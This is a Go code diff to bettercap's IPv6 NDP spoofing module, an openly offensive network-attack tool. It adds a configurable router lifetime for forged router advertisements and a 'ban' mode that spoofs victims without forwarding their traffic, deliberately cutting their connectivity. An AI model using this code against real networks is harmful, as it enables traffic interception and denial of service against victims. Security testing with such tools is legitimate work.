@@ -2,28 +2,32 @@ package ndp_spoof
 
 import (
 	"fmt"
-	"github.com/bettercap/bettercap/packets"
-	"github.com/evilsocket/islazy/str"
 	"net"
 	"sync"
 	"time"
 
-	"github.com/bettercap/bettercap/session"
+	"github.com/bettercap/bettercap/v2/packets"
+	"github.com/evilsocket/islazy/str"
+
+	"github.com/bettercap/bettercap/v2/session"
 )
 
 type NDPSpoofer struct {
 	session.SessionModule
-	neighbour    net.IP
-	prefix       string
-	prefixLength int
-	addresses    []net.IP
-	waitGroup    *sync.WaitGroup
+	neighbour      net.IP
+	prefix         string
+	prefixLength   int
+	routerLifetime int
+	addresses      []net.IP
+	ban            bool
+	waitGroup      *sync.WaitGroup
 }
 
 func NewNDPSpoofer(s *session.Session) *NDPSpoofer {
 	mod := &NDPSpoofer{
 		SessionModule: session.NewSessionModule("ndp.spoof", s),
 		addresses:     make([]net.IP, 0),
+		ban:           false,
 		waitGroup:     &sync.WaitGroup{},
 	}
 
@@ -32,7 +36,9 @@ func NewNDPSpoofer(s *session.Session) *NDPSpoofer {
 	mod.AddParam(session.NewStringParameter("ndp.spoof.targets", "", "",
 		"Comma separated list of IPv6 victim addresses."))
 
-	mod.AddParam(session.NewStringParameter("ndp.spoof.neighbour", "fe80::1", "",
+	mod.AddParam(session.NewStringParameter("ndp.spoof.neighbour",
+		"fe80::1",
+		`^([:a-fA-F0-9]{6,})?$`,
 		"Neighbour IPv6 address to spoof, clear to disable NA."))
 
 	mod.AddParam(session.NewStringParameter("ndp.spoof.prefix", "d00d::", "",
@@ -41,13 +47,29 @@ func NewNDPSpoofer(s *session.Session) *NDPSpoofer {
 	mod.AddParam(session.NewIntParameter("ndp.spoof.prefix.length", "64",
 		"IPv6 prefix length for router advertisements."))
 
+	mod.AddParam(session.NewIntParameter("ndp.spoof.router_lifetime", "10",
+		"Router lifetime for router advertisements in seconds."))
+
 	mod.AddHandler(session.NewModuleHandler("ndp.spoof on", "",
 		"Start NDP spoofer.",
 		func(args []string) error {
 			return mod.Start()
 		}))
 
+	mod.AddHandler(session.NewModuleHandler("ndp.ban on", "",
+		"Start NDP spoofer in ban mode, meaning the target(s) connectivity will not work.",
+		func(args []string) error {
+			mod.ban = true
+			return mod.Start()
+		}))
+
 	mod.AddHandler(session.NewModuleHandler("ndp.spoof off", "",
+		"Stop NDP spoofer.",
+		func(args []string) error {
+			return mod.Stop()
+		}))
+
+	mod.AddHandler(session.NewModuleHandler("ndp.ban off", "",
 		"Stop NDP spoofer.",
 		func(args []string) error {
 			return mod.Stop()
@@ -82,6 +104,8 @@ func (mod *NDPSpoofer) Configure() error {
 	} else {
 		if err, neigh = mod.StringParam("ndp.spoof.neighbour"); err != nil {
 			return err
+		} else if neigh == "" {
+			mod.neighbour = nil
 		} else if mod.neighbour = net.ParseIP(neigh); mod.neighbour == nil {
 			return fmt.Errorf("can't parse neighbour address %s", neigh)
 		}
@@ -100,13 +124,22 @@ func (mod *NDPSpoofer) Configure() error {
 
 	if err, mod.prefix = mod.StringParam("ndp.spoof.prefix"); err != nil {
 		return err
-	} else if err, mod.prefixLength = mod.IntParam("ndp.spoof.prefix.length"); err != nil {
+	}
+	if err, mod.prefixLength = mod.IntParam("ndp.spoof.prefix.length"); err != nil {
+		return err
+	}
+	if err, mod.routerLifetime = mod.IntParam("ndp.spoof.router_lifetime"); err != nil {
 		return err
 	}
 
 	if !mod.Session.Firewall.IsForwardingEnabled() {
-		mod.Info("enabling forwarding")
-		mod.Session.Firewall.EnableForwarding(true)
+		if mod.ban {
+			mod.Warning("running in ban mode, forwarding not enabled!")
+			mod.Session.Firewall.EnableForwarding(false)
+		} else {
+			mod.Info("enabling forwarding")
+			mod.Session.Firewall.EnableForwarding(true)
+		}
 	}
 
 	return nil
@@ -122,7 +155,7 @@ func (mod *NDPSpoofer) Start() error {
 	}
 
 	return mod.SetRunning(true, func() {
-		mod.Info("ndp spoofer started - neighbour=%s prefix=%s", mod.neighbour, mod.prefix)
+		mod.Info("ndp spoofer started - targets=%s neighbour=%s prefix=%s", mod.addresses, mod.neighbour, mod.prefix)
 
 		mod.waitGroup.Add(1)
 		defer mod.waitGroup.Done()
@@ -131,7 +164,7 @@ func (mod *NDPSpoofer) Start() error {
 			if mod.prefix != "" {
 				mod.Debug("sending router advertisement for prefix %s(%d)", mod.prefix, mod.prefixLength)
 				err, ra := packets.ICMP6RouterAdvertisement(mod.Session.Interface.IPv6, mod.Session.Interface.HW,
-					mod.prefix,	uint8(mod.prefixLength))
+					mod.prefix, uint8(mod.prefixLength), uint16(mod.routerLifetime))
 				if err != nil {
 					mod.Error("error creating ra packet: %v", err)
 				} else if err = mod.Session.Queue.Send(ra); err != nil {
@@ -164,6 +197,7 @@ func (mod *NDPSpoofer) Start() error {
 func (mod *NDPSpoofer) Stop() error {
 	return mod.SetRunning(false, func() {
 		mod.Info("waiting for NDP spoofer to stop ...")
+		mod.ban = false
 		mod.waitGroup.Wait()
 	})
 }
@@ -179,6 +213,8 @@ func (mod *NDPSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
 		// do we have this ip mac address?
 		if hw, err := mod.Session.FindMAC(ip, probe); err == nil {
 			targets[ip.String()] = hw
+		} else {
+			mod.Info("couldn't get MAC for ip=%s, put it into the neighbour table manually e.g. ping -6", ip)
 		}
 	}
 
